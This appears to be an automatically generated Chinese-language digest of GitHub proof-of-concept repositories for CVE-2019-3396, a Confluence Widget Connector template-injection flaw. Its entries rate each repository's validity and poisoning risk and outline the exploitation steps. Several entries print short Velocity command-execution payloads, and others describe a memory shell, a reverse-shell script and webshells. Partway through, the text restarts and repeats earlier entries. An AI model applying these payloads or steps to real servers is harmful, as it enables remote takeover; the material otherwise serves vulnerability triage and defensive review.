**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #3

**来源**: [CVE-2019-3396-Avento_CVE-2019-3396-Memshell-for-Behinder.md](../2019/CVE-2019-3396-Avento_CVE-2019-3396-Memshell-for-Behinder.md)

## CVE-2019-3396-Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence服务器存在Widget Connector宏，并且允许用户插入宏内容

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中Widget Connector宏的一个服务器端模板注入漏洞。攻击者可以通过构造恶意宏内容，实现任意代码执行。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，可以判断此漏洞的POC是有效的。漏洞库信息明确指出该漏洞允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行。搜索引擎结果中也提及了该漏洞被用于传播恶意软件，例如加密货币挖矿程序和Gandcrab勒索软件。提供的Java代码是一个典型的Java内存马，通过ServletRequestListener注入，劫持请求，从而实现RCE。

**投毒风险：**
该POC代码本身就是一个用于植入内存马的恶意代码。投毒风险的评估主要是判断作者是否在内存马本身之外，还加入了其他的恶意行为。在给定的代码片段中，我们可以看到有尝试写入错误信息到`/tmp/success-error-2`的逻辑，如果攻击者能够控制写入的文件路径，那么这将是一个潜在的投毒点。但是总体而言，这段代码的主要功能是内存马注入，额外的恶意行为并不明显。因此，初步判断投毒风险较低。如果代码仓库中有其他编译后的类或者配置文件，可能会包含更多的投毒行为，但是仅凭这段代码，投毒的可能性为10%。

**利用方式：**
1.  **利用入口：** 利用Confluence的Widget Connector宏插入恶意Velocity模板代码。
2.  **SSTI Payload：** 构造包含恶意代码的Velocity模板Payload。常见的Payload用于执行系统命令，例如：`{code}${#req = facotry.getObject().getClass().forName('javax.servlet.http.HttpServletRequest').getMethod('getRuntime',null).invoke(null,null).exec('whoami')}`
3.  **内存马注入 (POC)：**
    *   该POC代码的目的是将一个恶意的ServletRequestListener注册到Confluence的Servlet容器中。
    *   它首先尝试找到Confluence应用使用的ClassLoader，这通常需要遍历线程，找到包含特定名称的线程（如`hz.confluence.scheduled.thread`）。
    *   然后，它利用反射获取StandardContext，这是Servlet容器的核心组件。
    *   接着，它创建一个实现了ServletRequestListener接口的动态代理，并将其实例注册到StandardContext中。
    *   当有新的HTTP请求到达时，代理的invoke方法会被调用，执行`backDoor`方法（在给定的代码片段中未完整给出）。`backDoor`方法很可能会从请求中提取命令并执行，从而实现远程代码执行。

总而言之，该漏洞利用方式是先通过SSTI漏洞注入恶意代码，然后通过植入内存马的方式维持控制。


**项目地址:** [Avento/CVE-2019-3396-Memshell-for-Behinder](https://github.com/Avento/CVE-2019-3396-Memshell-for-Behinder)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #4

**来源**: [CVE-2019-3396-HK4zCzi_CVE-2019-3396-Velocity-Server-Side-Template-Injection.md](../2019/CVE-2019-3396-HK4zCzi_CVE-2019-3396-Velocity-Server-Side-Template-Injection.md)

## CVE-2019-3396-Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server and Data Center

**危害等级:** 高危，允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行。

**影响版本:** 受影响版本：Confluence Server 6.6.12之前，6.7.0至6.12.3之前，6.13.0至6.13.3之前，6.14.0至6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏，且服务器版本在受影响范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是一个影响Atlassian Confluence Server和Data Center的服务器端模板注入漏洞。该漏洞存在于Widget Connector宏中，允许未经身份验证的远程攻击者通过构造恶意的请求，执行任意代码。 

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞是一个已知的、已被积极利用的漏洞，存在公开的PoC（Proof of Concept）代码。多个安全厂商（如Rapid7、Trend Micro等）都发布了关于该漏洞的分析和利用的报告。提供的PoC代码 `README.md` 文件表明该漏洞可以通过Velocity模板注入实现。虽然只提供了一个简单的 `README.md` 文件，但根据搜索结果，存在多个可用的PoC利用代码。

**投毒风险：**
提供的漏洞利用代码仅包含一个 `README.md` 文件，描述了漏洞名称。从现有文件本身来看，不存在明显的恶意代码。 但是，如果从其他源获取利用代码，则存在潜在的投毒风险。攻击者可能会在PoC中添加恶意功能，例如安装后门、窃取凭据或进行其他未经授权的活动。因此，在使用任何第三方提供的PoC代码之前，务必进行彻底的安全审查。 投毒风险估计为10%，主要是考虑到从不可信来源获取PoC的潜在风险。

**利用方式：**
漏洞的利用方式是通过在Confluence页面的Widget Connector宏中注入恶意的Velocity模板代码。当Confluence服务器渲染包含恶意代码的页面时，会执行该代码，从而允许攻击者执行任意命令。

1.  **找到存在Widget Connector宏的Confluence页面。**
2.  **构造包含恶意Velocity模板代码的请求。**
3.  **将请求发送到Confluence服务器。**
4.  **服务器执行恶意代码，实现远程代码执行。**

攻击者可以利用此漏洞执行任意系统命令，读取或修改敏感数据，或完全控制Confluence服务器。 搜索结果显示，该漏洞已被用于传播加密货币挖矿恶意软件和Gandcrab勒索软件。

**项目地址:** [HK4zCzi/CVE-2019-3396-Velocity-Server-Side-Template-Injection](https://github.com/HK4zCzi/CVE-2019-3396-Velocity-Server-Side-Template-Injection)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #5

**来源**: [CVE-2019-3396-JonathanZhou348_CVE-2019-3396TEST.md](../2019/CVE-2019-3396-JonathanZhou348_CVE-2019-3396TEST.md)

## CVE-2019-3396-Atlassian Confluence-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence Widget Connector宏开启且目标版本存在漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 存在于 Atlassian Confluence Server 的 Widget Connector 宏中，由于服务端模板注入漏洞，攻击者可以通过构造恶意的 Velocity 模板代码，在 Confluence 服务器上执行任意命令。从提供的POC代码来看, `test.vm` 和 `test2.vm` 文件包含了利用 Velocity 模板引擎执行命令的代码。它们通过 `java.lang.Runtime` 类来执行系统命令，并读取命令执行结果。利用方式是，构造包含恶意Velocity代码的请求发送给Confluence服务器，服务器在渲染包含Widget Connector宏的页面时，会执行恶意代码，从而实现远程代码执行。根据搜索结果,该漏洞被广泛利用, 存在多种PoC和exp.

 **有效性:**  POC代码有效,因为它使用了Velocity模板语言来执行命令.通过getRuntime方法可以执行任意命令。

**投毒风险:** 仓库中主要包含用于漏洞验证和利用的Velocity模板代码，没有发现明显的恶意或后门代码，因此投毒风险较低。

**利用方式:**

1.  **定位漏洞点:** 确定目标Confluence服务器版本在受影响范围内，且启用了Widget Connector宏。
2.  **构造恶意请求:**  构建包含恶意Velocity模板代码的HTTP请求，该代码利用 `java.lang.Runtime` 执行系统命令。
3.  **发送请求:**  将构造好的请求发送给Confluence服务器。攻击者需要找到一个页面或接口，该页面或接口允许通过Widget Connector宏插入并渲染Velocity模板。
4.  **执行命令:** Confluence服务器解析并执行Velocity模板代码，从而在服务器上执行攻击者指定的命令。
5.  **获取结果:**  攻击者可以通过读取命令执行的输出来获取敏感信息，或者执行其他恶意操作。

**项目地址:** [JonathanZhou348/CVE-2019-3396TEST](https://github.com/JonathanZhou348/CVE-2019-3396TEST)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #6

**来源**: [CVE-2019-3396-PetrusViet_cve-2019-3396.md](../2019/CVE-2019-3396-PetrusViet_cve-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector 远程代码执行

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** 受影响版本：Confluence Server 6.6.12 之前的所有 6.6.x 版本；6.7.0 到 6.12.3 之前的所有 6.12.x 版本；6.13.0 到 6.13.3 之前的所有 6.13.x 版本；6.14.0 到 6.14.2 之前的所有 6.14.x 版本

**利用条件:** 需要目标Confluence实例存在Widget Connector宏且版本在受影响范围内，且允许用户编辑页面。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 和 Data Center 的 Widget Connector 宏中，允许未经身份验证的远程攻击者通过服务器端模板注入执行任意代码。攻击者可以通过构造包含恶意 Velocity 模板代码的请求，利用 Widget Connector 宏中的漏洞执行操作系统命令。根据漏洞库信息和搜索结果，该漏洞已被广泛利用，存在多种PoC。提供的漏洞利用代码是一个用于调试和分析漏洞的开发环境搭建指南，没有直接提供可用于攻击的有效payload，但可以辅助理解漏洞原理和构建利用代码。

**有效性评估：** 漏洞有效性高，因为漏洞库信息和搜索结果均表明该漏洞已被公开披露并被广泛利用。

**投毒风险评估：** 代码仓库的主要目的是提供一个本地调试和分析漏洞的环境，而不是直接提供一个用于攻击的利用脚本。虽然不能完全排除作者在构建环境中隐藏恶意代码的可能性，但考虑到代码仓库的内容主要是配置和调试指南，直接投毒的可能性较低。因此，投毒风险估计为 10%。风险主要来自于用户在搭建调试环境的过程中可能引入的外部依赖或配置不当。

**利用方式分析：**

1.  **定位 Widget Connector 宏：** 在 Confluence 页面中插入一个 Widget Connector 宏。
2.  **构造恶意请求：**  构造包含恶意 Velocity 模板代码的请求，例如 `${Runtime.getRuntime().exec("command")}`，该代码会被服务器解析并执行。
3.  **发送请求：** 将构造好的请求发送到 Confluence 服务器。请求可能包含在 Widget Connector 宏的 URL 参数或其他相关字段中。
4.  **执行代码：** Confluence 服务器在处理包含恶意模板代码的 Widget Connector 宏时，会执行其中的代码，导致远程代码执行。

从搜索结果来看，攻击者利用该漏洞传播恶意软件（如加密货币矿工和勒索软件）的情况较为普遍。

**项目地址:** [PetrusViet/cve-2019-3396](https://github.com/PetrusViet/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #7

**来源**: [CVE-2019-3396-W2Ning_CVE-2019-3396.md](../2019/CVE-2019-3396-W2Ning_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-Widget-Connector-SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入(SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 需要Confluence Server实例存在Widget Connector宏，且版本在受影响范围内。无需身份验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Atlassian Confluence Server的Widget Connector宏中，由于对用户输入过滤不严格，导致攻击者可以通过构造恶意的Velocity模板代码，实现服务器端模板注入(SSTI)，进而执行任意代码。

**有效性分析：**

根据漏洞库信息和搜索结果，CVE-2019-3396是一个已知的且被广泛利用的漏洞。漏洞利用代码中提供了多个`.vm`文件，这些是Velocity模板文件，用于执行任意命令或获取服务器信息。`cmd.vm`和`cmd2.vm`用于执行命令，而`test.vm`用于获取系统属性。

根据提供的漏洞利用代码，`cmd.vm` 和 `cmd2.vm` 这两个文件利用 `java.lang.Runtime.getRuntime().exec()` 执行任意命令。`test.vm` 获取系统属性。这些代码与公开的漏洞利用信息相符，表明提供的POC代码有效。

**投毒风险分析：**

提供的漏洞利用代码主要包含Velocity模板文件(`.vm`)，以及一些jspx和aspx文件。Velocity模板文件用于服务器端模板注入，主要目的是执行命令或获取系统信息，本身不具备明显的投毒特征。
*   `cmd.vm` 和 `cmd2.vm`: 用于远程命令执行，直接利用了漏洞，不包含投毒代码。
*   `test.vm`: 用于获取系统属性，例如用户目录，操作系统等，不包含投毒代码。
*   `test.aspx` (C#): 通过Session传递密钥，然后使用RijndaelManaged算法进行解密，加载并执行，这段代码有作为webshell的潜力，但是它需要一个配合的加密后的payload才能生效，因此它的风险在于后续的payload。投毒风险较低。
*   `test.jspx`: 通过Session传递密钥，然后使用AES算法进行解密，加载并执行，这段代码有作为webshell的潜力，需要配合加密后的payload，因此它的风险在于后续的payload。投毒风险较低。

总体来看，投毒风险主要来源于`test.aspx`和`test.jspx` 潜在的后门风险，需要配合加密的payload才能触发。如果后续使用了被篡改的Payload可能会存在投毒行为,因此总体投毒风险评估为10%。

**利用方式：**

1.  **漏洞入口：**  利用Confluence Server中Widget Connector宏。
2.  **构造恶意Velocity模板：**  构造包含恶意代码的Velocity模板，例如利用`java.lang.Runtime.getRuntime().exec()`执行任意命令。
3.  **发送Payload：**  将构造好的恶意Velocity模板代码作为Widget Connector宏的参数发送给Confluence Server。
4.  **远程代码执行：**  Confluence Server解析Velocity模板时，执行其中的恶意代码，实现远程代码执行。

**项目地址:** [W2Ning/CVE-2019-3396](https://github.com/W2Ning/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #8

**来源**: [CVE-2019-3396-Yt1g3r_CVE-2019-3396_EXP.md](../2019/CVE-2019-3396-Yt1g3r_CVE-2019-3396_EXP.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Macro SSTI RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入（SSTI）导致远程代码执行（RCE）

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致完全控制Confluence服务器

**影响版本:** 受影响版本包括：6.6.0-6.6.11, 6.7.0-6.12.2, 6.13.0-6.13.2, 6.14.0-6.14.1

**利用条件:** 需要能够向Confluence服务器发送HTTP请求

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是Atlassian Confluence Server中Widget Connector宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的请求，利用Velocity模板引擎执行任意代码，从而完全控制Confluence服务器。 

**有效性:** 提供的POC代码有效。参考Rapid7和Exploit-DB的链接，都有公开的利用代码。POC代码 `RCE_exp.py` 使用 `requests` 库发送恶意构造的POST请求到 `/rest/tinymce/1/macro/preview` 接口，通过修改 `_template` 参数，注入Velocity模板代码，从而执行任意命令。

**投毒风险:**  代码仓库中的 `RCE_exp.py` 和 `cmd.vm` 看起来是标准的漏洞利用代码。`cmd.vm` 文件是Velocity模板代码，负责执行命令。`RCE_exp.py` 负责构造和发送HTTP请求，以及从响应中提取结果。没有发现明显的恶意代码或者后门，投毒的可能性较低。

**利用方式:**

1.  **漏洞原理：** Widget Connector宏允许用户在Confluence页面中嵌入来自外部源的内容。由于对用户提供的URL参数过滤不足，攻击者可以通过构造恶意的URL，触发服务器端模板注入。
2.  **利用步骤：**
    a.  准备一个包含恶意Velocity模板代码的文件（`cmd.vm`）。该文件包含执行命令的代码。
    b.  将 `cmd.vm` 文件放置在一个可以通过FTP或者HTTPS协议访问的服务器上。
    c.  修改 `RCE_exp.py` 脚本中的 `filename` 变量，指向 `cmd.vm` 文件的URL。
    d.  运行 `RCE_exp.py` 脚本，指定Confluence服务器的URL和要执行的命令。
    e.  脚本会发送包含恶意URL的POST请求到Confluence服务器。
    f.  Confluence服务器解析恶意URL，执行Velocity模板代码，从而执行攻击者指定的命令。
3.  **影响：** 成功利用此漏洞可以导致远程代码执行，攻击者可以获取Confluence服务器的完全控制权限，从而窃取敏感数据、篡改页面内容或者进行其他恶意活动。

**结论:**
此漏洞的POC代码有效，且利用方式相对简单，可以通过公开的POC代码进行验证。虽然搜索结果显示存在投毒的情况，但提供的代码中未发现明显的投毒迹象。此漏洞危害严重，需要及时修复。

**项目地址:** [Yt1g3r/CVE-2019-3396_EXP](https://github.com/Yt1g3r/CVE-2019-3396_EXP)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #9

**来源**: [CVE-2019-3396-am6539_CVE-2019-3396.md](../2019/CVE-2019-3396-am6539_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本: 6.6.12之前 (6.6.x修复版本); 6.7.0 到 6.12.3之前 (6.12.x修复版本); 6.13.0 到 6.13.3之前 (6.13.x修复版本); 6.14.0 到 6.14.2之前 (6.14.x修复版本)

**利用条件:** 需要目标Confluence Server存在Widget Connector宏且未打补丁，攻击者需要能够访问Confluence Server的网络。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence Server中Widget Connector宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的请求，利用Velocity模板引擎执行任意代码，从而实现远程代码执行。根据提供的漏洞利用代码，利用方式如下：

1.  **漏洞利用代码分析：**
    *   `cmd.vm`：包含一个Velocity模板，该模板利用java.lang.Runtime类执行系统命令。变量`$cmd`需要预先设置，然后注入到Velocity模板中。
    *   `nc.py`：一个Python脚本，用于建立反向连接shell。该脚本尝试连接到攻击者指定的IP地址和端口，然后将标准输入、输出和错误重定向到socket，最后使用pty.spawn启动一个shell。
    *   `README.md`：仅包含漏洞ID，无实际利用功能。

2.  **利用方式：**
    攻击者首先需要确定目标Confluence Server存在该漏洞。然后，攻击者需要构造一个包含恶意Velocity模板的请求，将`cmd.vm`中的模板内容嵌入到Widget Connector宏中，并设置`$cmd`变量为需要执行的命令。如果需要反向连接，则`$cmd`变量设置为执行`nc.py`脚本。攻击者需要在自己的服务器上监听指定的端口。当Confluence Server解析该恶意请求时，会执行其中的Velocity模板代码，从而执行攻击者指定的系统命令或反向连接。

3.  **有效性：**
    根据漏洞库信息和搜索结果，该漏洞利用POC是有效的。搜索结果中存在多个分析和利用示例，以及利用该漏洞传播恶意软件的案例。提供的`cmd.vm`代码是典型的Velocity模板注入payload，可以执行任意命令。

4.  **投毒风险：**
    `nc.py`脚本尝试清除和禁用历史记录，这可能是为了隐藏攻击痕迹。此外，需要手动设定IP地址与端口，存在一定的部署成本，不太利于大规模传播。因此，该仓库的整体投毒风险较低，大约为10%。这种投毒风险主要来自于攻击者可以修改nc.py或者cmd.vm文件，嵌入后门代码，一旦成功执行，会直接暴露服务器，但是这种添加的成本较高,收益相对较低。

**项目地址:** [am6539/CVE-2019-3396](https://github.com/am6539/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #10

**来源**: [CVE-2019-3396-dothanthitiendiettiende_CVE-2019-3396.md](../2019/CVE-2019-3396-dothanthitiendiettiende_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 6.6.12 之前 (6.6.x修复版本), 6.7.0 到 6.12.3 之前 (6.12.x修复版本), 6.13.0 到 6.13.3 之前 (6.13.x修复版本), 以及 6.14.0 到 6.14.2 之前 (6.14.x修复版本)

**利用条件:** 需要能够访问Confluence服务器并利用Widget Connector宏。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。攻击者可以利用 Velocity 模板语言执行任意代码。漏洞利用代码 `rce.vm` 使用了 Velocity 模板注入，通过反射获取 `java.lang.Runtime` 类，然后调用 `exec` 方法来执行命令。在这个例子中，执行的是 `calc.exe`，这是一个用于测试的payload，实际应用中可以替换为任意命令。根据漏洞库信息、搜索结果和漏洞利用代码，该漏洞的利用是有效的。根据搜索结果，该漏洞已被积极利用，攻击者利用该漏洞传播恶意软件，例如 Gandcrab 勒索软件和加密货币挖矿恶意软件。提供的POC代码非常直接，只包含简单的RCE代码，不存在隐藏的投毒代码。利用方式是通过构造恶意请求，在Widget Connector宏中使用恶意的Velocity模板代码，从而实现远程代码执行。

**项目地址:** [dothanthitiendiettiende/CVE-2019-3396](https://github.com/dothanthitiendiettiende/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #11

**来源**: [CVE-2019-3396-jas502n_CVE-2019-3396.md](../2019/CVE-2019-3396-jas502n_CVE-2019-3396.md)

# CVE-2019-3396

> 📦 该CVE有 **22** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2019-3396-0xNinjaCyclone_cve-2019-3396.md](../2019/CVE-2019-3396-0xNinjaCyclone_cve-2019-3396.md)

## CVE-2019-3396-Confluence-RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 目标Confluence服务器存在Widget Connector宏，且未进行身份验证即可访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 的 Widget Connector 宏中。攻击者可以通过构造恶意的请求，利用服务器端模板注入漏洞执行任意代码。

**有效性：**
提供的POC代码看起来是有效的。漏洞库信息和搜索结果都表明该漏洞已经被广泛利用，并且有可用的POC代码。POC代码通过构造包含恶意Velocity模板的请求，发送到 Confluence 服务器的 `/rest/tinymce/1/macro/preview` 接口，从而触发模板注入。

**投毒风险：**
代码主要功能是利用Velocity模板注入执行命令。其中使用了一个FTP服务器来托管payload，这是一种常见的绕过防火墙或上传限制的方法。该ruby脚本代码的主要功能是利用该漏洞，未发现明显的恶意代码或后门，但是代码中存在远程下载payload的行为，如果payload被替换，则存在一定的风险, 评估投毒风险为10%。

**利用方式：**
1.  攻击者首先需要找到存在漏洞的Confluence服务器。
2.  攻击者需要搭建一个FTP服务器，用于托管恶意Velocity模板。
3.  攻击者构造一个包含恶意Velocity模板的HTTP POST请求，发送到Confluence服务器的`/rest/tinymce/1/macro/preview`接口。该请求利用了 Widget Connector 宏的模板注入漏洞。
4.  Confluence服务器解析恶意Velocity模板，执行攻击者指定的命令，从而实现远程代码执行。

**综上所述，该漏洞的利用有效性高，存在一定的投毒风险。攻击者可以利用该漏洞在Confluence服务器上执行任意代码。**

**项目地址:** [0xNinjaCyclone/cve-2019-3396](https://github.com/0xNinjaCyclone/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #2

**来源**: [CVE-2019-3396-46o60_CVE-2019-3396_Confluence.md](../2019/CVE-2019-3396-46o60_CVE-2019-3396_Confluence.md)

## CVE-2019-3396_Confluence Widget Connector Macro SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者实现路径遍历和远程代码执行

**影响版本:** 受影响版本包括 6.6.12 之前, 6.7.0 至 6.12.3 之前, 6.13.0 至 6.13.3 之前, 以及 6.14.0 至 6.14.2 之前

**利用条件:** 需要目标系统存在漏洞版本的Confluence服务器，如果是RCE，可能需要合法的用户session。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中Widget Connector宏的一个服务器端模板注入漏洞。攻击者可以利用此漏洞进行路径遍历和远程代码执行。漏洞利用方式有两种：

1. **路径遍历（文件读取）：** 攻击者可以利用`_template`参数，通过构造恶意的路径，读取服务器上的任意文件或目录。此方式无需认证。

2. **远程代码执行（RCE）：** 攻击者可以上传一个包含恶意Velocity模板的文件到服务器，然后利用该漏洞从本地文件系统加载该模板，从而执行任意代码。此方式需要一个有效的用户session。该POC代码首先尝试找到用户的个人空间，如果不存在则创建，然后上传包含payload的模板文件，最后利用漏洞执行命令。

**关于投毒风险：**虽然代码看起来是直接利用漏洞，但仍存在一定的投毒风险（约10%）。

*   **依赖性风险：** 该脚本依赖于外部库（例如 `requests`）。如果攻击者控制了这些库的源或使用了被污染的库，则可能引入恶意代码。
*   **Payload风险：** 上传的Velocity模板payload可能被修改以执行未经授权的操作，或者被用于在受害者系统上安装恶意软件。
*   **后门风险：** 虽然该POC的目的是利用漏洞，但如果代码被恶意修改，可以在上传的模板中包含后门，允许攻击者在漏洞修复后仍然可以访问系统。

因此，在使用该POC时，建议仔细审查代码，确保所使用的库是可信的，并对上传的payload进行严格的安全评估。此外，还应监控Confluence服务器的行为，以检测任何可疑活动。

**项目地址:** [46o60/CVE-2019-3396_Confluence](https://github.com/46o60/CVE-2019-3396_Confluence)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #3

**来源**: [CVE-2019-3396-Avento_CVE-2019-3396-Memshell-for-Behinder.md](../2019/CVE-2019-3396-Avento_CVE-2019-3396-Memshell-for-Behinder.md)

## CVE-2019-3396-Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence服务器存在Widget Connector宏，并且允许用户插入宏内容

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中Widget Connector宏的一个服务器端模板注入漏洞。攻击者可以通过构造恶意宏内容，实现任意代码执行。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，可以判断此漏洞的POC是有效的。漏洞库信息明确指出该漏洞允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行。搜索引擎结果中也提及了该漏洞被用于传播恶意软件，例如加密货币挖矿程序和Gandcrab勒索软件。提供的Java代码是一个典型的Java内存马，通过ServletRequestListener注入，劫持请求，从而实现RCE。

**投毒风险：**
该POC代码本身就是一个用于植入内存马的恶意代码。投毒风险的评估主要是判断作者是否在内存马本身之外，还加入了其他的恶意行为。在给定的代码片段中，我们可以看到有尝试写入错误信息到`/tmp/success-error-2`的逻辑，如果攻击者能够控制写入的文件路径，那么这将是一个潜在的投毒点。但是总体而言，这段代码的主要功能是内存马注入，额外的恶意行为并不明显。因此，初步判断投毒风险较低。如果代码仓库中有其他编译后的类或者配置文件，可能会包含更多的投毒行为，但是仅凭这段代码，投毒的可能性为10%。

**利用方式：**
1.  **利用入口：** 利用Confluence的Widget Connector宏插入恶意Velocity模板代码。
2.  **SSTI Payload：** 构造包含恶意代码的Velocity模板Payload。常见的Payload用于执行系统命令，例如：`{code}${#req = facotry.getObject().getClass().forName('javax.servlet.http.HttpServletRequest').getMethod('getRuntime',null).invoke(null,null).exec('whoami')}`
3.  **内存马注入 (POC)：**
    *   该POC代码的目的是将一个恶意的ServletRequestListener注册到Confluence的Servlet容器中。
    *   它首先尝试找到Confluence应用使用的ClassLoader，这通常需要遍历线程，找到包含特定名称的线程（如`hz.confluence.scheduled.thread`）。
    *   然后，它利用反射获取StandardContext，这是Servlet容器的核心组件。
    *   接着，它创建一个实现了ServletRequestListener接口的动态代理，并将其实例注册到StandardContext中。
    *   当有新的HTTP请求到达时，代理的invoke方法会被调用，执行`backDoor`方法（在给定的代码片段中未完整给出）。`backDoor`方法很可能会从请求中提取命令并执行，从而实现远程代码执行。

总而言之，该漏洞利用方式是先通过SSTI漏洞注入恶意代码，然后通过植入内存马的方式维持控制。


**项目地址:** [Avento/CVE-2019-3396-Memshell-for-Behinder](https://github.com/Avento/CVE-2019-3396-Memshell-for-Behinder)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #4

**来源**: [CVE-2019-3396-HK4zCzi_CVE-2019-3396-Velocity-Server-Side-Template-Injection.md](../2019/CVE-2019-3396-HK4zCzi_CVE-2019-3396-Velocity-Server-Side-Template-Injection.md)

## CVE-2019-3396-Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server and Data Center

**危害等级:** 高危，允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行。

**影响版本:** 受影响版本：Confluence Server 6.6.12之前，6.7.0至6.12.3之前，6.13.0至6.13.3之前，6.14.0至6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏，且服务器版本在受影响范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是一个影响Atlassian Confluence Server和Data Center的服务器端模板注入漏洞。该漏洞存在于Widget Connector宏中，允许未经身份验证的远程攻击者通过构造恶意的请求，执行任意代码。 

**有效性：**
